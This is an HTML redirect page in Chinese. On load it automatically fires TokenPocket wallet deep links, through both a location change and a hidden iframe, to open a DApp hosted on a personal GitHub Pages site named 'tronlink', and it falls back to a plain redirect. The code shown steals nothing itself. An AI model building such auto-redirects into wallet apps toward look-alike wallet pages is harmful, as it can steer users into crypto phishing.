<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>跳转到Token Pocket</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      text-align: center;
      padding: 20px;
    }
    .container {
      max-width: 400px;
    }
    .loading {
      font-size: 18px;
      margin-bottom: 20px;
    }
    .spinner {
      border: 3px solid rgba(255,255,255,0.3);
      border-top: 3px solid white;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .link {
      display: inline-block;
      margin-top: 20px;
      padding: 12px 24px;
      background: white;
      color: #667eea;
      text-decoration: none;
      border-radius: 8px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="loading">正在跳转到Token Pocket钱包...</div>
    <div class="spinner"></div>
    <p>如果没有自动跳转，请点击下方按钮</p>
    <a href="#" id="openLink" class="link">在Token Pocket中打开</a>
  </div>

  <script>
    // 目标DAPP地址
    const DAPP_URL = 'https://amylee850608.github.io/tronlink/';
    
    // 检测是否在Token Pocket中打开
    function isInTokenPocket() {
      const ua = navigator.userAgent || navigator.vendor || window.opera;
      return /TokenPocket/i.test(ua) || window.tp || window.tokenpocket;
    }
    
    // Token Pocket URL scheme - 尝试多种格式
    const encodedUrl = encodeURIComponent(DAPP_URL);
    
    // 尝试打开Token Pocket并加载DAPP
    function openTokenPocket() {
      // 如果已经在Token Pocket中，直接显示提示并跳转
      if (isInTokenPocket()) {
        console.log('已经在Token Pocket中，跳转到DAPP');
        window.location.href = DAPP_URL;
        return;
      }
      
      // 尝试多种URL scheme格式
      const schemes = [
        `tpdapp://open?dappUrl=${encodedUrl}`,
        `tpdapp://open?url=${encodedUrl}`,
        `tpdapp://open?dappUrl=${DAPP_URL}`,
        `tpdapp://${DAPP_URL.replace(/^https?:\/\//, '')}`
      ];
      
      let tried = 0;
      
      function tryScheme(index) {
        if (index >= schemes.length) {
          // 所有格式都失败，显示提示并跳转到DAPP页面
          document.querySelector('.loading').textContent = '请在Token Pocket钱包中打开下方链接';
          document.getElementById('openLink').href = DAPP_URL;
          document.getElementById('openLink').textContent = '打开DAPP页面';
          setTimeout(() => {
            window.location.href = DAPP_URL;
          }, 2000);
          return;
        }
        
        const scheme = schemes[index];
        console.log(`尝试格式${index + 1}:`, scheme);
        
        // 使用window.location尝试
        window.location.href = scheme;
        
        // 同时使用iframe方式
        setTimeout(() => {
          try {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = scheme;
            document.body.appendChild(iframe);
            setTimeout(() => {
              if (iframe.parentNode) {
                iframe.parentNode.removeChild(iframe);
              }
            }, 1000);
          } catch(e) {
            console.log('iframe方式失败');
          }
        }, 100);
        
        // 如果1秒后还在当前页面，尝试下一个格式
        setTimeout(() => {
          if (document.hasFocus() || document.visibilityState === 'visible') {
            tried++;
            if (tried >= schemes.length) {
              // 所有格式都失败
              tryScheme(schemes.length);
            } else {
              tryScheme(index + 1);
            }
          }
        }, 1000);
      }
      
      // 开始尝试
      tryScheme(0);
    }
    
    // 设置点击事件
    document.getElementById('openLink').addEventListener('click', function(e) {
      e.preventDefault();
      openTokenPocket();
    });
    
    // 页面加载后立即尝试跳转（不等待load事件）
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', openTokenPocket);
    } else {
      openTokenPocket();
    }
  </script>
</body>
</html>
